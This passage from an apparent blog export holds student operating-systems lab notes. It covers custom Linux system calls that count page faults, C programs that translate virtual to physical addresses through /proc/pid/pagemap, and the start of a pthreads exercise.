sys_set_target_program_name</span><br><span class="line"><span class="number">449</span>   <span class="number">64</span>   get_page_fault_count        sys_get_page_fault_count</span><br></pre></td></tr></table></figure><h4 id="System-Call-ID-Declaration-include-uapi-asm-generic-unistd-h"><a href="#System-Call-ID-Declaration-include-uapi-asm-generic-unistd-h" class="headerlink" title="System Call ID Declaration ./include/uapi/asm-generic/unistd.h"></a>System Call ID Declaration <code>./include/uapi/asm-generic/unistd.h</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add declarations for two system calls</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_target_program_name 448</span></span><br><span class="line">__SYSCALL(__NR_set_target_program_name, sys_set_target_program_name)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_page_fault_count 449</span></span><br><span class="line">__SYSCALL(__NR_get_page_fault_count, sys_get_page_fault_count)</span><br></pre></td></tr></table></figure><h3 id="Write-Test-Code-After-Kernel-Compilation"><a href="#Write-Test-Code-After-Kernel-Compilation" class="headerlink" title="Write Test Code After Kernel Compilation"></a>Write Test Code After Kernel Compilation</h3><p>The compilation will report an error as follows:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-3-error1.png" alt="Error"></p><p>Initially I didn’t know what this error meant, and after modifying for a long time without effect, I later added <code>#include &lt;linux/syscalls.h&gt;</code> and it worked. This means that if you define system calls, you must include this header file. But the error message is not very clear, which caused me to waste a lot of time.</p><p>Below is test1.c, test2.c just removes the newly added system calls. This is to test that the debug information is controllable.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Assume these are the numbers for your new system calls</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_SET_TARGET_PROGRAM_NAME 448</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_GET_PAGE_FAULT_COUNT 449</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> size = <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> <span class="built_in">array</span>[<span class="number">1000</span>][<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Set target program name</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *target_program = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    syscall(SYS_SET_TARGET_PROGRAM_NAME, target_program);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute operations that may trigger page faults</span></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; size; j++) &#123;</span><br><span class="line">            <span class="built_in">array</span>[i][j] = i + j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get and output page fault count</span></span><br><span class="line">    syscall(SYS_GET_PAGE_FAULT_COUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Program-Execution-Results-1"><a href="#Program-Execution-Results-1" class="headerlink" title="Program Execution Results"></a>Program Execution Results</h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-3-test_result.png" alt="Program execution result"></p><p>As shown in the figure, only the page fault count for the test1 program was printed, while the page fault count for the test2 program was not printed.</p><h2 id="Task-4-Calculate-VA-to-PA-Mapping-using-proc-pid-pagemap-in-Linux"><a href="#Task-4-Calculate-VA-to-PA-Mapping-using-proc-pid-pagemap-in-Linux" class="headerlink" title="Task 4: Calculate VA to PA Mapping using &#x2F;proc&#x2F;pid&#x2F;pagemap in Linux"></a>Task 4: Calculate VA to PA Mapping using &#x2F;proc&#x2F;pid&#x2F;pagemap in Linux</h2><h3 id="Task-Requirements-3"><a href="#Task-Requirements-3" class="headerlink" title="Task Requirements"></a>Task Requirements</h3><ol><li><p>Linux’s &#x2F;proc&#x2F;pid&#x2F;pagemap file allows users to view physical addresses and other related information of current process virtual pages. Each virtual page contains a 64-bit value, pay attention to analyzing the 64-bit information.</p></li><li><p>Get the full name of the current process’s pagemap file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Example code from ppt</span></span><br><span class="line"><span class="type">pid_t</span> pid = getpid();</span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;%d&quot;</span>, pid);</span><br><span class="line"><span class="built_in">strcpy</span>(filename, <span class="string">&quot;/proc/&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(filename, buf);</span><br><span class="line"><span class="built_in">strcat</span>(filename, <span class="string">&quot;/pagemap&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can be done in one step</span></span><br><span class="line"><span class="built_in">sprintf</span>(filename, <span class="string">&quot;/proc/%d/pagemap&quot;</span>, pid);</span><br></pre></td></tr></table></figure></li><li><p>Can output virtual addresses, page numbers, physical page frame numbers, physical addresses and other information of one or more global variables or custom functions in the process.</p></li></ol><p>Thinking:</p><p>(1) How to extend the experiment (write a general function) to show the physical address corresponding to a specified virtual address of a specified process.</p><p>(2) How to extend the experiment to verify that different processes’ shared libraries (e.g., some known, commonly called *.so libraries) have the same physical address.</p><h3 id="Code-Implementation-2"><a href="#Code-Implementation-2" class="headerlink" title="Code Implementation"></a>Code Implementation</h3><p>program.c implements output of virtual addresses, page numbers, physical page frame numbers, physical addresses and other information of one or more global variables or custom functions.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPhysicalAddress</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *description, <span class="type">unsigned</span> <span class="type">long</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pageSize = getpagesize();                            <span class="comment">// Get system-set page size</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_pageIndex = vaddr / pageSize;            <span class="comment">// Calculate number of pages passed relative to 0x0 for this virtual address</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_offset = v_pageIndex * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>); <span class="comment">// Calculate offset in /proc/pid/page_map file</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> page_offset = vaddr % pageSize;            <span class="comment">// Calculate offset of virtual address within page</span></span><br><span class="line">    <span class="type">uint64_t</span> item = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/pagemap&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(buf, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lseek(fd, v_offset, SEEK_SET); <span class="comment">// Move file pointer to corresponding position in file to get item</span></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;item, <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)) != <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error reading pagemap&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> phy_pageIndex = (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>) &amp; item;      <span class="comment">// Physical page number, i.e., take bits 0-54 of item</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> paddr = (phy_pageIndex * pageSize) + page_offset; <span class="comment">// Physical address = physical page number * page size + page offset</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;【%s】pid = %d, Virtual address = 0x%lx, Page number = %lu, Physical address = 0x%lx, Physical page frame number = %lu\n&quot;</span>,</span><br><span class="line">           description, getpid(), vaddr, v_pageIndex, paddr, phy_pageIndex);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">100</span>; <span class="comment">// Global constant</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">100</span>;                   <span class="comment">// Local variable</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> c = <span class="number">100</span>;            <span class="comment">// Local static variable</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> d = <span class="number">100</span>;             <span class="comment">// Local constant</span></span><br><span class="line">    <span class="type">char</span> *p = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>); <span class="comment">// Dynamic memory</span></span><br><span class="line"></span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;Global constant&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;a);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;Local variable&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;b);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;Local static variable&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;c);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;Local constant&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;d);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;Dynamic memory&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)p);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>va2pa.c implements output of physical address corresponding to a specified virtual address of a specified process.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Logic is the same as above, just pid and vaddr are parameters</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPhysicalAddressForProcess</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">unsigned</span> <span class="type">long</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pageSize = getpagesize();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_pageIndex = vaddr / pageSize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_offset = v_pageIndex * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> page_offset = vaddr % pageSize;</span><br><span class="line">    <span class="type">uint64_t</span> item = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> pagemap_file[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(pagemap_file, <span class="string">&quot;/proc/%d/pagemap&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(pagemap_file, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lseek(fd, v_offset, SEEK_SET);</span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;item, <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)) != <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error reading pagemap&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> phy_pageIndex = (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>) &amp; item;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> paddr = (phy_pageIndex * pageSize) + page_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pid = %d, Virtual address = 0x%lx, Page number = %lu, Physical address = 0x%lx, Physical page frame number = %lu\n&quot;</span>,</span><br><span class="line">           pid, vaddr, v_pageIndex, paddr, phy_pageIndex);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s &lt;pid&gt; &lt;virtual address&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vaddr = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    printPhysicalAddressForProcess(pid, vaddr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.c is a test program used to verify that different processes’ shared libraries have the same physical address. For example, the printf function in this program is in the <strong>libc.so</strong> shared library.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PID: %d, Virtual address of printf: %p\n&quot;</span>, getpid(), (<span class="type">void</span> *)<span class="built_in">printf</span>);</span><br><span class="line">    sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Program-Execution-Results-2"><a href="#Program-Execution-Results-2" class="headerlink" title="Program Execution Results"></a>Program Execution Results</h3><blockquote><p>Must run with sudo, otherwise this file should not have permission to open</p></blockquote><h4 id="program-c"><a href="#program-c" class="headerlink" title="program.c"></a>program.c</h4><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-4-program1.png" alt="program.c execution result"></p><h4 id="va2pa-c-test-c"><a href="#va2pa-c-test-c" class="headerlink" title="va2pa.c &amp;&amp; test.c"></a>va2pa.c &amp;&amp; test.c</h4><p>Start two test processes, output the virtual addresses of the printf function respectively. va2pa.c calculates the physical addresses corresponding to the virtual addresses of the printf function for both processes.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-4-va2pa.png" alt="va2pa.c program execution result"></p><p>The two red boxes on the right print the pid of the currently running test program and the virtual address of the printf function, then use the process number and virtual address as parameters for va2pa.c to calculate the physical address. The results are shown in the two boxes on the left. The physical addresses corresponding to the virtual addresses of the printf function for both processes (marked with blue highlighter) are the same, proving that different processes’ shared libraries have the same physical address.</p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Operating System Lab2: Process&amp;Thread Synchronization Mechanisms and Application Programming</title>
      <link href="/2023/11/29/HUST%20Operating%20System%20Lab2:%20Process&amp;Thread%20Synchronization%20Mechanisms%20and%20Application%20Programming/"/>
      <url>/2023/11/29/HUST%20Operating%20System%20Lab2:%20Process&amp;Thread%20Synchronization%20Mechanisms%20and%20Application%20Programming/</url>
      
        <content type="html"><![CDATA[<h1 id="Operating-System-Lab2"><a href="#Operating-System-Lab2" class="headerlink" title="Operating System Lab2"></a>Operating System Lab2</h1><h2 id="Experiment-Objectives"><a href="#Experiment-Objectives" class="headerlink" title="Experiment Objectives"></a>Experiment Objectives</h2><ol><li>Understand the concepts and application programming process of processes&#x2F;threads;</li><li>Understand the synchronization mechanisms and application programming of processes&#x2F;threads;</li><li>Master and promote domestic operating systems (recommend Galaxy Kylin or Ubuntu Kylin)</li></ol><h2 id="Experiment-Content"><a href="#Experiment-Content" class="headerlink" title="Experiment Content"></a>Experiment Content</h2><ol><li>Create 2 threads A and B in Linux&#x2F;Windows to loop output data or strings.</li><li>Create (fork) a child process in Linux, experiment with wait&#x2F;exit functions</li><li>Use threads to implement concurrent drawing of circles and squares in Windows&#x2F;Linux.</li><li>Use threads to implement “producer-consumer” synchronization control in Windows or Linux</li><li>Use signal mechanism (signal) to implement inter-process communication in Linux</li><li>Simulate dining philosophers in Windows or Linux, provide deadlock and non-deadlock solutions.</li><li>Study Linux kernel and use printk to debug process creation and scheduling policy related information.</li></ol><h2 id="Task-1-Create-2-Threads-A-and-B-in-Linux-Windows-to-Loop-Output-Data-or-Strings"><a href="#Task-1-Create-2-Threads-A-and-B-in-Linux-Windows-to-Loop-Output-Data-or-Strings" class="headerlink" title="Task 1: Create 2 Threads A and B in Linux&#x2F;Windows to Loop Output Data or Strings"></a>Task 1: Create 2 Threads A and B in Linux&#x2F;Windows to Loop Output Data or Strings</h2><p>Requirements:</p><ol><li><p>Use pthread thread library or CreateThread function</p></li><li><p>Thread A outputs 1-1000 in ascending order; Thread B outputs 1000-1 in descending order. To avoid output being too fast, output one number every 0.2 seconds (adjustable).</p></li><li><p>When outputting data, also output “A” or “B” to indicate which thread is outputting, and pay attention to formatted output information. For example:</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A:1000</span><br><span class="line">A:0999</span><br><span class="line">B:0001</span><br><span class="line">A:0998</span><br><span class="line">B:0002</span><br></pre></td></tr></table></figure></li></ol><h3 id="Write-Code-and-Compile"><a href="#Write-Code-and-Compile" class="headerlink" title="Write Code and Compile"></a>Write Code and Compile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Thread A function - ascending output</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">print_numbers_ascending</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;A:%04d\n&quot;</span>, i);</span><br><span class="line">        usleep(<span class="number">200000</span>); <span class="comment">// pause 0.2 seconds</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Thread B function - descending output</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">print_numbers_descending</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1000</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;B:%04d\n&quot;</span>, i);</span><br><span class="line">        usleep(<span class="number">200000</span>); <span class="comment">// pause 0.2 seconds</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> threadA, threadB;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create threads</span></span><br><span class="line">    pthread_create(&amp;threadA, <span class="literal">NULL</span>, print_numbers_ascending, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;threadB, <span class="literal">NULL</span>, print_numbers_descending, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait for threads to finish</span></span><br><span class="line">    pthread_join(threadA, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(threadB, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pthread_create function: creates a thread</span></span><br><span class="line"><span class="comment"> * Function prototype int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);</span></span><br><span class="line"><span class="comment"> * pthread_t *thread: This is a pointer to a pthread_t type variable, pthread_t is usually used to identify threads. After the function executes successfully, this variable will be assigned the identifier of the newly created thread.</span></span><br><span class="line"><span class="comment"> * const pthread_attr_t *attr: Pointer to pthread_attr_t structure, used to set thread attributes. If NULL is passed, default attributes are used.</span></span><br><span class="line"><span class="comment"> * void *(*start_routine) (void *): Pointer to the function that will be executed by the new thread. This function must accept a void * type parameter and return a void * type value.</span></span><br><span class="line"><span class="comment"> * void *arg: Parameter passed to the start_routine function. This can be a pointer to any type, depending on your specific needs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pthread_join function: waits for a thread to terminate</span></span><br><span class="line"><span class="comment"> * Function prototype int pthread_join(pthread_t thread, void **retval);</span></span><br><span class="line"><span class="comment"> * pthread_t thread: The thread identifier to wait for. This is the identifier returned when creating a thread with pthread_create function.</span></span><br><span class="line"><span class="comment"> * void **retval: If not NULL, points to a location used to store the exit status returned by the 